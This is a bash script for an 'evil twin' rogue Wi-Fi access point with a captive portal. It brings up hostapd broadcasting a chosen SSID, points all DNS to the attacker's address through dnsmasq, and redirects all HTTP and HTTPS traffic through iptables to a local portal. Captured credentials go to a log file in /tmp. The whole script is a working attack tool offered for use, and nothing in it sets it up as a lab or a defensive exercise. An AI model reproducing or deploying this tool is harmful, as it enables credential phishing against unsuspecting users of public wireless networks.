#!/usr/bin/env bash
# scripts/evil_twin.sh
# Evil Twin Access Point with Captive Portal.
#
# Usage:
#   sudo ./scripts/evil_twin.sh start <ssid> [channel]
#   sudo ./scripts/evil_twin.sh stop
#   sudo ./scripts/evil_twin.sh status

MODE="${1:-status}"
SSID="${2:-Free WiFi}"
CHANNEL="${3:-6}"

IFACE="wlan0"
AP_IP="192.168.66.1"
DHCP_RANGE="192.168.66.10,192.168.66.50,255.255.255.0,1h"
LOG_FILE="/tmp/evil_twin_creds.log"
HOSTAPD_CONF="/tmp/evil_twin_hostapd.conf"
DNSMASQ_CONF="/tmp/evil_twin_dnsmasq.conf"
PORTAL_PID="/tmp/evil_twin_portal.pid"
HOSTAPD_PID="/tmp/evil_twin_hostapd.pid"
DNSMASQ_PID="/tmp/evil_twin_dnsmasq.pid"

_stop() {
    echo "[Evil Twin] Stopping..."
    [ -f "$PORTAL_PID" ]   && kill "$(cat $PORTAL_PID)"   2>/dev/null; rm -f "$PORTAL_PID"
    [ -f "$HOSTAPD_PID" ]  && kill "$(cat $HOSTAPD_PID)"  2>/dev/null; rm -f "$HOSTAPD_PID"
    [ -f "$DNSMASQ_PID" ]  && kill "$(cat $DNSMASQ_PID)"  2>/dev/null; rm -f "$DNSMASQ_PID"
    pkill -f "hostapd $HOSTAPD_CONF" 2>/dev/null || true
    sudo pkill -f "portal_server.py" 2>/dev/null || true
    sudo lsof -ti:80 | xargs sudo kill -9 2>/dev/null || true
    iptables -t nat -F 2>/dev/null || true
    iptables -F FORWARD 2>/dev/null || true
    ip link set "$IFACE" down 2>/dev/null || true
    iw dev "$IFACE" set type managed 2>/dev/null || true
    ip link set "$IFACE" up 2>/dev/null || true
    nmcli device set "$IFACE" managed yes 2>/dev/null || true
    systemctl restart NetworkManager 2>/dev/null || true
    echo "[Evil Twin] Stopped."
}

_status() {
    if [ -f "$HOSTAPD_PID" ] && kill -0 "$(cat $HOSTAPD_PID)" 2>/dev/null; then
        echo "running"
    else
        echo "stopped"
    fi
}

_start() {
    echo "[Evil Twin] Starting AP: '$SSID' ch$CHANNEL..."

    # Disconnect from current network
    nmcli device set "$IFACE" managed no 2>/dev/null || true
    systemctl stop wpa_supplicant 2>/dev/null || true
    ip link set "$IFACE" down
    sleep 0.5
    ip link set "$IFACE" up
    ip addr flush dev "$IFACE"
    ip addr add "$AP_IP/24" dev "$IFACE"

    # hostapd config
    printf "interface=%s\ndriver=nl80211\nssid=%s\nhw_mode=g\nchannel=%s\nmacaddr_acl=0\nauth_algs=1\nignore_broadcast_ssid=0\n" \
        "$IFACE" "$SSID" "$CHANNEL" > "$HOSTAPD_CONF"

    hostapd -B -P "$HOSTAPD_PID" "$HOSTAPD_CONF"
    sleep 1

    if ! kill -0 "$(cat $HOSTAPD_PID 2>/dev/null)" 2>/dev/null; then
        echo "[Evil Twin] ERROR: hostapd failed."
        exit 1
    fi

    # dnsmasq config — redirect ALL dns to us
    printf "interface=%s\nbind-interfaces\ndhcp-range=%s\naddress=/#/%s\ndhcp-option=3,%s\ndhcp-option=6,%s\nno-resolv\n" \
        "$IFACE" "$DHCP_RANGE" "$AP_IP" "$AP_IP" "$AP_IP" > "$DNSMASQ_CONF"

    dnsmasq --conf-file="$DNSMASQ_CONF" --pid-file="$DNSMASQ_PID"
    sleep 0.5

    # Redirect all HTTP/HTTPS to captive portal
    iptables -t nat -A PREROUTING -i "$IFACE" -p tcp --dport 80  -j DNAT --to-destination "$AP_IP:80"
    iptables -t nat -A PREROUTING -i "$IFACE" -p tcp --dport 443 -j DNAT --to-destination "$AP_IP:80"
    echo 1 > /proc/sys/net/ipv4/ip_forward

    echo "[Evil Twin] Running. SSID='$SSID' IP=$AP_IP"
    echo "[Evil Twin] Creds log: $LOG_FILE"
}

case "$MODE" in
    start)  _start  ;;
    stop)   _stop   ;;
    status) _status ;;
    *) echo "Usage: $0 start <ssid> [channel] | stop | status"; exit 1 ;;
esac
